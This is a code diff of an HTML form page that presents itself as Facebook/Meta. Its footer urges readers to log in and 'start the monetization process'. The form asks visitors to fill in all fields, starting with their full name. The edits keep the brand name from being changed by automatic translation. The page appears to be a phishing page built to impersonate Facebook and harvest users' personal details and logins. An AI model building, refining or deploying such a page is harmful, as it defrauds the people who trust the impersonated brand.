@@ -1,16 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <!-- Prevent Google Translate from changing title/brand -->
   <meta name="google" content="notranslate">
+
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title><span class="notranslate">Facebook</span> - Form</title>
+
+  <!-- Title stays exact -->
+  <title>Facebook - Form</title>
+
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <header><span class="notranslate">Facebook</span></header>
   <div class="container">
-    <div class="logo"><div class="logo-circle">F</div></div>
+    <div class="logo"><div class="logo-circle notranslate">F</div></div>
     <h2>Please fill in all fields carefully.</h2>
     <form id="bigForm">
       <input name="fullname" placeholder="Full Name" required>
@@ -63,14 +68,9 @@
   <footer>
     <p><span class="notranslate">Facebook</span> © 2025 – This is <span class="notranslate">Facebook</span> / ∞Meta. Use this <span class="notranslate">Facebook</span> monetization link to log into your account and start the monetization process.</p>
   </footer>
-  <script src="script.js"></script>
-</body>
-</html>
- </main>
 
   <!-- Google Translate -->
   <div id="google_translate_element" style="display:none;"></div>
-
   <script type="text/javascript">
     function googleTranslateElementInit() {
       new google.translate.TranslateElement(
